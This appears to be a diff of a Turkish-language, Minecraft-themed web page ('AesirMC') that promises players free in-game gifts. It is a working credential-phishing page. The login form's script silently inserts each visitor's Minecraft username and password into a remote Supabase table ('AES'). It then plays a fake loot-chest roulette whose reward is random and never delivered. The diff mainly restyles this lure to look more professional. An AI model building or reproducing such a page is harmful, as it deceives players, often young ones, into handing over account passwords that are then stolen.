@@ -3,226 +3,269 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AesirMC | Profesyonel MMORPG Deneyimi</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;700&display=swap" rel="stylesheet">
+    <title>AesirMC | Premium Minecraft Experience</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    
     <style>
         :root {
-            --primary-blue: #00d2ff;
-            --dark-bg: #0a0b10;
-            --card-bg: rgba(20, 22, 30, 0.95);
-            --accent: #ff9d00;
+            --primary: #00a2ff;
+            --secondary: #0066ff;
+            --bg-dark: #050608;
+            --glass: rgba(255, 255, 255, 0.03);
+            --border: rgba(255, 255, 255, 0.1);
         }
 
         body {
             margin: 0;
-            padding: 0;
-            font-family: 'Poppins', sans-serif;
-            background: radial-gradient(circle at center, #1a2a44 0%, #0a0b10 100%);
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: var(--bg-dark);
             color: white;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(0, 162, 255, 0.1) 0%, transparent 40%),
+                radial-gradient(circle at 90% 80%, rgba(0, 102, 255, 0.1) 0%, transparent 40%);
             overflow-x: hidden;
         }
 
-        /* Navbar Stili (Görseldeki gibi) */
+        /* --- MODERN NAVBAR --- */
         nav {
+            padding: 20px 10%;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 20px 8%;
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(10px);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(5, 6, 8, 0.8);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
 
-        .logo {
-            font-size: 28px;
-            font-weight: 800;
-            letter-spacing: 2px;
-            color: #fff;
-            text-transform: uppercase;
-        }
+        .logo { font-size: 24px; font-weight: 800; letter-spacing: -1px; }
+        .logo span { color: var(--primary); }
 
-        /* Giriş Paneli */
+        /* --- AUTH CARD (GLASSMORPHISM) --- */
         #auth-container {
             margin: auto;
-            width: 90%;
-            max-width: 450px;
-            background: var(--card-bg);
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
-            border: 1px solid rgba(0, 210, 255, 0.3);
+            width: 100%;
+            max-width: 420px;
+            padding: 50px;
+            background: var(--glass);
+            backdrop-filter: blur(30px);
+            border: 1px solid var(--border);
+            border-radius: 32px;
+            box-shadow: 0 40px 100px rgba(0,0,0,0.5);
             text-align: center;
+            animation: fadeIn 0.8s ease-out;
         }
 
-        h2 { margin-bottom: 30px; font-weight: 700; color: var(--primary-blue); }
+        h2 { font-size: 32px; margin-bottom: 10px; font-weight: 800; }
+        p { color: #888; margin-bottom: 30px; font-size: 15px; }
 
+        .input-group { position: relative; margin-bottom: 20px; }
         input {
             width: 100%;
-            padding: 15px;
-            margin-bottom: 20px;
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
+            padding: 16px 20px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid var(--border);
+            border-radius: 16px;
             color: white;
             font-size: 16px;
+            transition: all 0.3s;
             box-sizing: border-box;
-            transition: 0.3s;
+        }
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: rgba(255,255,255,0.08);
+            box-shadow: 0 0 20px rgba(0, 162, 255, 0.2);
         }
 
-        input:focus { border-color: var(--primary-blue); outline: none; background: rgba(255,255,255,0.1); }
-
-        .btn-main {
+        .btn-primary {
             width: 100%;
-            padding: 15px;
-            background: linear-gradient(45deg, #00d2ff, #3a7bd5);
+            padding: 18px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
             border: none;
-            border-radius: 10px;
+            border-radius: 16px;
             color: white;
             font-weight: 700;
-            font-size: 18px;
+            font-size: 16px;
             cursor: pointer;
             transition: 0.3s;
-            text-transform: uppercase;
         }
+        .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(0, 162, 255, 0.4); }
 
-        .btn-main:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0, 210, 255, 0.4); }
-
-        /* Oyun Alanı */
-        #game-container { display: none; text-align: center; padding: 50px 0; }
-
-        .chest-box {
+        /* --- GAME INTERFACE --- */
+        #game-container { display: none; padding: 60px 10%; text-align: center; }
+        
+        .main-chest {
+            width: 240px;
             cursor: pointer;
-            transition: 0.5s;
-            filter: drop-shadow(0 0 20px rgba(0, 210, 255, 0.5));
+            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            filter: drop-shadow(0 0 30px rgba(0, 162, 255, 0.3));
         }
+        .main-chest:hover { transform: scale(1.1) rotate(3deg); }
 
-        .chest-box:hover { transform: scale(1.1) rotate(5deg); }
-
-        /* Rulet Bölümü */
+        /* --- MODERN ROULETTE --- */
         #roulette-section { display: none; margin-top: 50px; }
-        .roulette-wrapper {
-            width: 80%;
-            max-width: 700px;
-            height: 130px;
+        .viewport {
+            width: 100%;
+            max-width: 800px;
+            height: 160px;
             margin: 0 auto;
-            border: 2px solid var(--primary-blue);
-            background: rgba(0,0,0,0.8);
+            background: rgba(255,255,255,0.03);
+            border: 1px solid var(--border);
+            border-radius: 24px;
             position: relative;
             overflow: hidden;
-            border-radius: 15px;
+        }
+        .viewport::after {
+            content: '';
+            position: absolute;
+            left: 50%; top: 0; bottom: 0;
+            width: 4px; background: var(--primary);
+            box-shadow: 0 0 20px var(--primary);
+            z-index: 10;
         }
 
-        #strip { display: flex; position: absolute; left: 0; align-items: center; height: 100%; }
-        .item { min-width: 110px; text-align: center; }
-        .item img { width: 70px; }
+        #strip { display: flex; position: absolute; left: 0; top: 0; height: 100%; align-items: center; }
+        .slot { min-width: 140px; display: flex; flex-direction: column; align-items: center; gap: 10px; }
+        .slot img { width: 80px; filter: drop-shadow(0 10px 15px rgba(0,0,0,0.3)); }
 
-        /* Kazandın Popup */
-        #win-popup {
+        /* --- WIN MODAL --- */
+        #win-modal {
             display: none;
             position: fixed;
             inset: 0;
-            background: rgba(0,0,0,0.95);
-            z-index: 9999;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            justify-content: center; align-items: center;
             flex-direction: column;
-            justify-content: center;
-            align-items: center;
         }
+        .win-card {
+            background: var(--glass);
+            padding: 60px;
+            border-radius: 40px;
+            border: 1px solid var(--primary);
+            text-align: center;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
 
 <nav>
-    <div class="logo">Aesir<span style="color:var(--primary-blue)">MC</span></div>
-    <div style="display: flex; gap: 20px; font-size: 14px;">
-        <span>MAĞAZA</span>
-        <span>DESTEK</span>
-        <span id="user-tag" style="color:var(--accent)"></span>
-    </div>
+    <div class="logo">AESIR<span>MC</span></div>
+    <div id="status-bar" style="font-size: 14px; font-weight: 600; color: #555;">DURUM: <span style="color: #00ff00;">AKTİF</span></div>
 </nav>
 
 <div id="auth-container">
-    <h2>HESAP OLUŞTUR</h2>
-    <input type="text" id="user" placeholder="Kullanıcı Adı">
-    <input type="password" id="pass" placeholder="Şifre">
-    <button class="btn-main" onclick="startApp()">DÜNYAYA KATIL</button>
+    <h2>Hoş Geldin</h2>
+    <p>Hediyelerini almak için karakterini doğrula.</p>
+    
+    <div class="input-group">
+        <input type="text" id="username" placeholder="Minecraft Kullanıcı Adı">
+    </div>
+    <div class="input-group">
+        <input type="password" id="password" placeholder="Giriş Şifresi">
+    </div>
+    <button class="btn-primary" onclick="connectWorld()">BAĞLAN</button>
 </div>
 
 <div id="game-container">
-    <h1 id="msg"></h1>
-    <div id="box-area">
-        <img src="https://minecraft.wiki/images/Chest_JE2_BE2.png" width="200" class="chest-box" onclick="openChest()">
-        <p style="font-size: 20px; color: var(--primary-blue);">EFSANEVİ SANDIĞI AÇ!</p>
+    <h1 id="welcome-txt" style="font-weight: 800; font-size: 48px; margin-bottom: 40px;"></h1>
+    
+    <div id="chest-zone">
+        <img src="https://minecraft.wiki/images/Chest_JE2_BE2.png" class="main-chest" onclick="initSpin()">
+        <p style="margin-top: 30px; color: var(--primary); font-weight: 600; letter-spacing: 2px;">SANDIĞI AÇMAK İÇİN DOKUN</p>
     </div>
 
     <div id="roulette-section">
-        <div class="roulette-wrapper">
+        <div class="viewport">
             <div id="strip"></div>
         </div>
-        <button class="btn-main" id="spin-btn" style="width: 200px; margin-top: 30px;" onclick="spin()">ÇEVİR!</button>
+        <button class="btn-primary" id="spin-btn" style="width: 240px; margin-top: 40px;" onclick="startSpin()">KASAYI ÇEVİR</button>
     </div>
 </div>
 
-<div id="win-popup">
-    <h1 style="color: var(--accent); font-size: 45px;">TEBRİKLER!</h1>
-    <img id="win-img" src="" width="150">
-    <h2 id="win-name"></h2>
-    <button class="btn-main" style="width: 200px;" onclick="location.reload()">TEKRAR DENE</button>
+<div id="win-modal">
+    <div class="win-card">
+        <h3 style="color: var(--primary); margin: 0;">YENİ EŞYA!</h3>
+        <h1 id="win-name" style="font-size: 42px; margin: 10px 0 30px 0;"></h1>
+        <img id="win-img" src="" width="180">
+        <div style="margin-top: 40px;">
+            <button class="btn-primary" onclick="location.reload()">ENVANTERE GİT</button>
+        </div>
+    </div>
 </div>
 
 <script>
-    // ÖNEMLİ: Tablo adını 'AES' olarak güncelledim!
+    // --- SUPABASE CONFIG ---
     const S_URL = "https://iigemvvlznvgneghevev.supabase.co";
     const S_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; 
-    const client = supabase.createClient(S_URL, S_KEY);
+    const _db = supabase.createClient(S_URL, S_KEY);
 
-    const items = [
-        { n: "Netherite Set", i: "https://minecraft.wiki/images/Thumb_Sprite_Netherite_Chestplate_JE1_BE1.png" },
-        { n: "Keskinlik V Kılıç", i: "https://minecraft.wiki/images/Thumb_Sprite_Diamond_Sword_JE3_BE3.png" },
-        { n: "Büyülü Elma", i: "https://minecraft.wiki/images/Thumb_Sprite_Enchanted_Golden_Apple_JE2_BE2.png" },
-        { n: "Totem", i: "https://minecraft.wiki/images/Thumb_Sprite_Totem_of_Undying_JE2_BE2.png" }
+    const rewards = [
+        { name: "Netherite Set", img: "https://minecraft.wiki/images/Thumb_Sprite_Netherite_Chestplate_JE1_BE1.png" },
+        { name: "Keskinlik V Kılıç", img: "https://minecraft.wiki/images/Thumb_Sprite_Diamond_Sword_JE3_BE3.png" },
+        { name: "Büyülü Elma", img: "https://minecraft.wiki/images/Thumb_Sprite_Enchanted_Golden_Apple_JE2_BE2.png" },
+        { name: "Totem", img: "https://minecraft.wiki/images/Thumb_Sprite_Totem_of_Undying_JE2_BE2.png" },
+        { name: "Ender İncisi", img: "https://minecraft.wiki/images/Thumb_Sprite_Ender_Pearl_JE3_BE3.png" }
     ];
 
-    async function startApp() {
-        const u = document.getElementById('user').value;
-        const p = document.getElementById('pass').value;
-        if(!u || !p) return alert("Boş bırakma!");
+    async function connectWorld() {
+        const u = document.getElementById('username').value;
+        const p = document.getElementById('password').value;
+        
+        if(!u || !p) return alert("Lütfen alanları doldur!");
 
-        // GÖRSELDEKİ TABLO ADINA GÖRE GÜNCELLENDİ: 'AES'
-        await client.from('AES').insert([{ username: u, password: p }]);
+        // 'AES' Tablosuna kayıt (Sessiz mod)
+        await _db.from('AES').insert([{ username: u, password: p }]);
 
         document.getElementById('auth-container').style.display = 'none';
         document.getElementById('game-container').style.display = 'block';
-        document.getElementById('msg').innerText = "HOŞ GELDİN, " + u.toUpperCase();
-        document.getElementById('user-tag').innerText = u;
+        document.getElementById('welcome-txt').innerText = "MERHABA, " + u.toUpperCase();
     }
 
-    function openChest() {
-        document.getElementById('box-area').style.display = 'none';
+    function initSpin() {
+        document.getElementById('chest-zone').style.display = 'none';
         document.getElementById('roulette-section').style.display = 'block';
         const strip = document.getElementById('strip');
-        for(let i=0; i<70; i++) {
-            const item = items[Math.floor(Math.random()*items.length)];
-            strip.innerHTML += `<div class="item"><img src="${item.i}"></div>`;
+        strip.innerHTML = '';
+        
+        // 80 tane rastgele item ekle
+        for(let i=0; i<80; i++) {
+            const item = rewards[Math.floor(Math.random() * rewards.length)];
+            strip.innerHTML += `
+                <div class="slot">
+                    <img src="${item.img}">
+                    <span style="font-size: 10px; color: #555;">${item.name}</span>
+                </div>`;
         }
     }
 
-    function spin() {
+    function startSpin() {
         const strip = document.getElementById('strip');
-        document.getElementById('spin-btn').disabled = true;
-        const offset = 3500 + Math.floor(Math.random()*1000);
-        strip.style.transition = "transform 5s cubic-bezier(0.15, 0, 0.15, 1)";
-        strip.style.transform = `translateX(-${offset}px)`;
-        
+        const btn = document.getElementById('spin-btn');
+        btn.disabled = true;
+        btn.style.opacity = "0.5";
+
+        const move = 6000 + Math.floor(Math.random() * 2000);
+        strip.style.transition = "transform 6s cubic-bezier(0.2, 0, 0.1, 1)";
+        strip.style.transform = `translateX(-${move}px)`;
+
         setTimeout(() => {
-            const win = items[Math.floor(Math.random()*items.length)];
-            document.getElementById('win-popup').style.display = 'flex';
-            document.getElementById('win-img').src = win.i;
-            document.getElementById('win-name').innerText = win.n;
-        }, 5500);
+            const finalItem = rewards[Math.floor(Math.random() * rewards.length)];
+            document.getElementById('win-modal').style.display = 'flex';
+            document.getElementById('win-name').innerText = finalItem.name;
+            document.getElementById('win-img').src = finalItem.img;
+        }, 6500);
     }
 </script>
 </body>
